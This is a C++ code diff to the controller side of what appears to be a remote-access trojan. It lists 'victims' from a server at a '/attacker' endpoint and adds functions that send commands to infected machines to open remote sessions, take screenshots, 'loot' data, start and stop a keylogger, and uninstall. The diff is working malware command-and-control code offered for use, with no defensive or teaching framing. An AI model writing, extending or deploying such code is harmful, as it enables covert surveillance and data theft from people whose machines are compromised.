@@ -62,7 +62,7 @@ std::string Client::getPassword() const noexcept {
 //
 //-------------------------------------------------
 std::string Client::getServerUrl() const noexcept {
-    return m_config.get<std::string>(Key::client_server_url_key, "https://erarnitox.de:3000/attacker");
+    return m_config.get<std::string>(Key::client_server_url_key, "https://erarnitox.de:1337/attacker");
 }
 
 //-------------------------------------------------
@@ -150,13 +150,13 @@ bool Client::fetchVictims() noexcept {
 
     // make request
     try{
-        auto victim_list = m_rest_client.list<Victim>("/victims");
+        auto victim_list = m_rest_client.list<Victim>("api/victims");
         victim_count = victim_list.size();
         m_vic_man.setList(std::move(victim_list));
         updateStatusText();
         return true;
     } catch(const std::runtime_error& err) {
-        std::println("Fetching Victims Failed: {}", err.what());
+        m_log_man.local_log( std::format("Fetching Victims Failed: {}", err.what()));
         return false;
     }
 }
@@ -168,4 +168,236 @@ const std::vector<Victim>& Client::getVictims() const noexcept {
     const auto& vics = m_vic_man.getVictims();
     victim_count = vics.size();
     return vics;
+}
+
+//-------------------------------------------------
+//
+//-------------------------------------------------
+[[nodiscard]] bool Client::sendTimeoutCommand(const UUID& client_id, int timeout) {
+    m_rest_client.set_auth_basic(getUsername(), getPassword());
+
+    // send command to commands endpoint
+    try{
+        CommandDAO timeout_command;
+        timeout_command.command = std::format("timeout {}", timeout);
+        timeout_command.client = client_id;
+
+        const auto& cmd = m_rest_client.post<CommandDAO>("api/commands", timeout_command);
+
+        return cmd.id > 0;
+    } catch(const std::runtime_error& err) {
+        m_log_man.local_log( std::format("Sending Timeout Failed: {}", err.what()));
+        return false;
+    }
+}
+
+//-------------------------------------------------
+//
+//-------------------------------------------------
+[[nodiscard]] bool Client::sendOpenSessionCommand(const UUID& client_id, int64_t port) {
+    m_rest_client.set_auth_basic(getUsername(), getPassword());
+
+    // send command to commands endpoint
+    try{
+        CommandDAO cmd;
+        cmd.command = std::format("session {}", port);
+        cmd.client = client_id;
+
+        const auto& res = m_rest_client.post<CommandDAO>("api/commands", cmd);
+
+        return res.id > 0;
+    } catch(const std::runtime_error& err) {
+        m_log_man.local_log( std::format("Sending Open Session Command Failed: {}", err.what()));
+        return false;
+    }
+}
+
+//-------------------------------------------------
+//
+//-------------------------------------------------
+[[nodiscard]] bool Client::sendCloseSessionCommand(const UUID& client_id) {
+    m_rest_client.set_auth_basic(getUsername(), getPassword());
+
+    // send command to commands endpoint
+    try{
+        CommandDAO cmd;
+        cmd.command = "close";
+        cmd.client = client_id;
+
+        const auto& res = m_rest_client.post<CommandDAO>("api/commands", cmd);
+
+        return res.id > 0;
+    } catch(const std::runtime_error& err) {
+        m_log_man.local_log( std::format("Sending Open Session Command Failed: {}", err.what()));
+        return false;
+    }
+}
+
+//-------------------------------------------------
+//
+//-------------------------------------------------
+[[nodiscard]] bool Client::sendScreenshotCommand(const UUID& client_id) {
+     m_rest_client.set_auth_basic(getUsername(), getPassword());
+
+    // send command to commands endpoint
+    try{
+        CommandDAO cmd;
+        cmd.command = "screenshot";
+        cmd.client = client_id;
+
+        const auto& res = m_rest_client.post<CommandDAO>("api/commands", cmd);
+
+        return res.id > 0;
+    } catch(const std::runtime_error& err) {
+        m_log_man.local_log( std::format("Sending Open Session Command Failed: {}", err.what()));
+        return false;
+    }
+}
+
+//-------------------------------------------------
+//
+//-------------------------------------------------
+[[nodiscard]] bool Client::sendLootCommand(const UUID& client_id) {
+     m_rest_client.set_auth_basic(getUsername(), getPassword());
+
+    // send command to commands endpoint
+    try{
+        CommandDAO cmd;
+        cmd.command = "loot";
+        cmd.client = client_id;
+
+        const auto& res = m_rest_client.post<CommandDAO>("api/commands", cmd);
+
+        return res.id > 0;
+    } catch(const std::runtime_error& err) {
+        m_log_man.local_log( std::format("Sending Open Session Command Failed: {}", err.what()));
+        return false;
+    }
+}
+
+//-------------------------------------------------
+//
+//-------------------------------------------------
+[[nodiscard]] bool Client::sendStartKeyloggerCommand(const UUID& client_id) {
+    m_rest_client.set_auth_basic(getUsername(), getPassword());
+
+    // send command to commands endpoint
+    try{
+        CommandDAO cmd;
+        cmd.command = "keylogger_start";
+        cmd.client = client_id;
+
+        const auto& res = m_rest_client.post<CommandDAO>("api/commands", cmd);
+
+        return res.id > 0;
+    } catch(const std::runtime_error& err) {
+        m_log_man.local_log( std::format("Sending Open Session Command Failed: {}", err.what()));
+        return false;
+    }
+}
+
+//-------------------------------------------------
+//
+//-------------------------------------------------
+[[nodiscard]] bool Client::sendStopKeyloggerCommand(const UUID& client_id) {
+    m_rest_client.set_auth_basic(getUsername(), getPassword());
+
+    // send command to commands endpoint
+    try{
+        CommandDAO cmd;
+        cmd.command = "keylogger_stop";
+        cmd.client = client_id;
+
+        const auto& res = m_rest_client.post<CommandDAO>("api/commands", cmd);
+
+        return res.id > 0;
+    } catch(const std::runtime_error& err) {
+        m_log_man.local_log( std::format("Sending Open Session Command Failed: {}", err.what()));
+        return false;
+    }
+}
+
+//-------------------------------------------------
+//
+//-------------------------------------------------
+[[nodiscard]] bool Client::sendUninstallCommand(const UUID& client_id) {
+    m_rest_client.set_auth_basic(getUsername(), getPassword());
+
+    // send command to commands endpoint
+    try{
+        CommandDAO cmd;
+        cmd.command = "uninstall";
+        cmd.client = client_id;
+
+        const auto& res = m_rest_client.post<CommandDAO>("api/commands", cmd);
+
+        return res.id > 0;
+    } catch(const std::runtime_error& err) {
+        m_log_man.local_log( std::format("Sending Open Session Command Failed: {}", err.what()));
+        return false;
+    }
+}
+
+//-------------------------------------------------
+//
+//-------------------------------------------------
+[[nodiscard]] bool Client::sendTimeoutCommand(int64_t client_id, int timeout) {
+    const UUID& victim_uid = m_vic_man.getVictim(client_id).uid;
+    return sendTimeoutCommand(victim_uid, timeout);
+}
+
+//-------------------------------------------------
+//
+//-------------------------------------------------
+[[nodiscard]] bool Client::sendOpenSessionCommand(int64_t client_id, int64_t port) {
+    const UUID& victim_uid = m_vic_man.getVictim(client_id).uid;
+    return sendOpenSessionCommand(victim_uid, port);
+}
+
+//-------------------------------------------------
+//
+//-------------------------------------------------
+[[nodiscard]] bool Client::sendCloseSessionCommand(int64_t client_id) {
+    const UUID& victim_uid = m_vic_man.getVictim(client_id).uid;
+    return sendCloseSessionCommand(victim_uid);
+}
+
+//-------------------------------------------------
+//
+//-------------------------------------------------
+[[nodiscard]] bool Client::sendScreenshotCommand(int64_t client_id) {
+    const UUID& victim_uid = m_vic_man.getVictim(client_id).uid;
+    return sendScreenshotCommand(victim_uid);
+}
+
+//-------------------------------------------------
+//
+//-------------------------------------------------
+[[nodiscard]] bool Client::sendLootCommand(int64_t client_id) {
+    const UUID& victim_uid = m_vic_man.getVictim(client_id).uid;
+    return sendLootCommand(victim_uid);
+}
+
+//-------------------------------------------------
+//
+//-------------------------------------------------
+[[nodiscard]] bool Client::sendStartKeyloggerCommand(int64_t client_id) {
+    const UUID& victim_uid = m_vic_man.getVictim(client_id).uid;
+    return sendStartKeyloggerCommand(victim_uid);
+}
+
+//-------------------------------------------------
+//
+//-------------------------------------------------
+[[nodiscard]] bool Client::sendStopKeyloggerCommand(int64_t client_id) {
+    const UUID& victim_uid = m_vic_man.getVictim(client_id).uid;
+    return sendStopKeyloggerCommand(victim_uid);
+}
+
+//-------------------------------------------------
+//
+//-------------------------------------------------
+[[nodiscard]] bool Client::sendUninstallCommand(int64_t client_id) {
+    const UUID& victim_uid = m_vic_man.getVictim(client_id).uid;
+    return sendUninstallCommand(victim_uid);
 }
